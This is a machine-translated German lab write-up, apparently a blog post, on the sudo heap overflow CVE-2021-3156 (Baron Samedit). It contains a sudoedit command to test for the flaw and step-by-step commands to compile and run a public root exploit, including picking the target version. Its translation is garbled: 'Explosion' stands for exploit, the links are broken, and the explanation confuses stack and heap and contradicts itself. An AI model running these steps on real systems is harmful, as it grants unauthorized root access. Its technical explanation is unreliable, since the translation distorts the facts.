---
categories:
- Laboratorien
date: 2025-01-11 13:01:50 +0100
lang: de
original_lang: es
tags:
- Linux
- privilege escalation
- vulnerability
- cve-2021-3156
title: Baron Samedit - Scaling Privilegien in Linux
---

Im Januar 2021 veröffentlichte Qualys einen Artikel auf seinem Blog, der eine neue kritische Schwachstelle im Sudo-Programm von Unix erklärt.

Diese Schwachstelle war ein Speicherüberlauf im Heap-Puffer-Überlauf, der jedem Benutzer erlaubte, Root-Privilegien zu erhalten, ohne dass das System falsche Einstellungen hat. Die beunruhigende Sache an diesem Fehler ist, dass es mit der Standardkonfiguration funktioniert und jeden Benutzer betrifft, unabhängig von den Berechtigungen, die Sie in sudo gesetzt haben. Obwohl die Verwundbarkeit bereits korrigiert wurde, wirkt sie sich auf die nicht aktualisierten Versionen des Sudo-Programms zwischen 1,8,2 und 1,8,31p2 und zwischen 1,9,0 und 1,9,5p1 aus, was bedeutet, dass dieser Ausfall für ein Jahrzehnt vorhanden war.

Das Problem wurde schnell gelöst, und die geparched Versionen wurden bald in den offiziellen Repositories verteilt, so dass die aktualisierten Systeme nicht mehr gefährdet sind. In Systemen, die noch nicht aktualisiert wurden, bleibt diese Schwachstelle jedoch sehr gefährlich.

Diese Schwachstelle, wie der CVE-2019-18634, ist mit einem Speicherüberlauf im Sudo-Programm verbunden. Dabei handelt es sich jedoch um einen Überlauf im Haufen, nicht im Stapel, wie im vorherigen Fall. Der Stack ist ein Teil des Speichers, der Schlüsselprogrammdaten streng organisiert und verwaltet, während der Stapel ein flexibler Speicherplatz ist, der für dynamische Zuordnung verwendet wird. Obwohl wir die technischen Details nicht vertiefen, um den Inhalt zugänglich zu halten, ist es wichtig zu verstehen, dass diese Verwundbarkeit extrem leistungsstark ist und eine Vielzahl von Systemen betrifft.

## Comprobación

Zuerst prüfen wir, ob das System verletzlich ist:

```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

! [Wenn das System vulnearble ist, erhalten wir einen Speicherfehler] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 130150 _ 2025-01-11 _ 14-01.png)
- Ja. Wenn das System vulnearble ist, erhalten wir einen Speicher Korruption Fehler _

Diese PoC wurde von gesperrtbyte entdeckt:

[Github] (https: / github.com / gesperrtbyte / CVE-Exploits / Baum / Meister / CVE-2021-3156)

## Explotación

Als Qualys diese Schwachstelle verkündete, gab er nicht den vollen Code, um es auszunutzen. Jedoch gelang es anderen Forschern bald, den Ausfall wiederherzustellen. Die erste vollfunktionelle Explosion, die veröffentlicht wurde, wurde von einem Forscher namens bl4sty entwickelt, und sein Code ist in Github verfügbar. In dieser Praxis werden wir diese Explosion nutzen, um die Verwundbarkeit zu nutzen.

[Github] (https: / / github.com / blasty / CVE-2021-3156)

Mit dem klonierten Repository müssen wir das PoC kompilieren:

```bash
make
```

! [Explosion Compilation] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 130714 _ 2025-01-11 _ 14-07.png)

```bash
ls -la
```

! [Dateiliste] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 130918 _ 2025-01-11 _ 14-09.png)

```bash
./sudo-hax-me-a-sandwich
```

! [Explosion Ausführung] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 131028 _ 2025-01-11 _ 14-10.png)

Da wir die Systemversion auswählen müssen, können wir überprüfen, was wie folgt ist:

```bash
cat /etc/issue
```

! [Versionsprüfung] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 131601 _ 2025-01-11 _ 14-15.png)

Jetzt, wo wir das spezifische Verion kennen, das wir die Explosion führen:

```bash
./sudo-hax-me-a-sandwich 0
```

! [Endausführung der Explosion] (/ Vermögenswerte / img / Beiträge / baron _ gleichdit / 20250111 _ 131727 _ 2025-01-11 _ 14-17.png)

## Explicación

### Explicación del Heap Buffer Overflow

Ein Heap-Puffer-Überlauf erfolgt, wenn ein Programm mehr Daten auf einen Puffer (ein Speicherbereich) schreibt, als es handhaben kann. Heap ist ein Speicherbereich, der für die dynamische Speicherzuordnung verwendet wird, d.h. wenn das Programm während seiner Ausführung flexibel Speicher reservieren muss.

### El funcionamiento de la vulnerabilidad

Der Fehler stammt aus der Art, dass sudo bestimmte Argumente der Befehlszeile bei der Ausführung anderer Programme behandelt. sudo hat eine interne Funktion, die diese Argumente verarbeitet, und das ist, wo der Überlauf auftritt.

Normalerweise, wenn Sie Sudo verwenden, ist es für die Überprüfung, dass der Benutzer die erforderlichen Berechtigungen hat, um den Befehl auszuführen. Wenn alles gut ist, wird der Befehl mit hohen Privilegien ausgeführt.

Der Fehler ist damit verbunden, wie sudo Speicher für die Argumente eines laufenden Befehls behandelt. Durch einen Pufferüberlauf im Haufen kann ein kritischer Speicherbereich überschrieben werden, wodurch ein Angreifer den Steuerstrom des Programms verändern kann. Mit anderen Worten kann der Angreifer beliebigen Code in den Speicher des Programms injizieren und sein Verhalten ändern.

### Cómo se explota

Um diese Schwachstelle auszunutzen, sendet ein Angreifer einen schädlichen Eintrag in Sudo, der den Bufer Überlauf im Haufen verursacht. Dieser Überlauf könnte Schlüsseldaten im Programmspeicher, wie die Rücklaufrichtung einer Funktion oder Steuergrößen, korrumpieren, so dass der Angreifer beliebigen Code ausführen kann.

In diesem Fall muss der Angreifer nicht in einer Gruppe mit Sudo-Privilegien sein, weil der Ausfall nicht von der Sudoers-Konfiguration (die Datei, die entscheidet, wer Sudo verwenden kann), sondern von einem Defekt in der Verwaltung des Sudo-Speichers abhängt.

### Estructura de control del flujo (return address)

Eines der Hauptziele eines Pufferüberlaufs besteht darin, die Rücklaufrichtung einer Funktion zu überschreiben.

Diese Adresse wird im Stapel gespeichert, und wenn eine Funktion beendet ist, kehrt das Programm in die Richtung zurück, die in der Rücklaufgröße ist, um die Ausführung fortzusetzen.

Durch Überschreiben der Rücklaufrichtung kann das Programm dazu gebracht werden, in eine beliebige Speicherrichtung zu springen, anstatt in die Funktion zurückzukehren, die es nannte.

Es ermöglicht dem Angreifer, die Programmausführung auf bösartigen Code umzuleiten.

### Variables de control de seguridad (como los punteros a funciones)

Die Funktionen in sudo führen mehrere Sicherheitskontrollen durch, um sicherzustellen, dass der Benutzer die richtigen Berechtigungen hat. Ein Angreifer kann versuchen, Variablen im Zusammenhang mit der Zugriffskontrolle zu überschreiben, wie Punkte auf die Funktionen, die diese Überprüfungen durchführen.

Wenn diese Zeiger überschrieben sind, könnte es dazu führen, dass das Programm schädliche Funktionen anruft, anstatt Verifikationsfunktionen zuzulassen, was die Eskalation von Privilegien erlaubt.

Sie ermöglichen es dem Angreifer, Kontrollbesuche zu vermeiden und Befehle mit hohen Privilegien auszuführen.

### Memoria relacionada con la configuración de sudoers

Möglicherweise erlaubt der Angreifer Einstellungen zu manipulieren, um Befehle ohne Erlaubnis auszuführen.

### Buffers de argumentos de comando

Sie ermöglichen die Injektion von schädlichen Befehlen als root laufen.

### Punteros a la memoria en el heap

Sie ermöglichen es, die Ausführung auf Code umzuleiten, der vom Angreifer kontrolliert wird.

Dies ist eine Zusammenfassung des Konzepts so einfach wie möglich, um den Betrieb zu verstehen.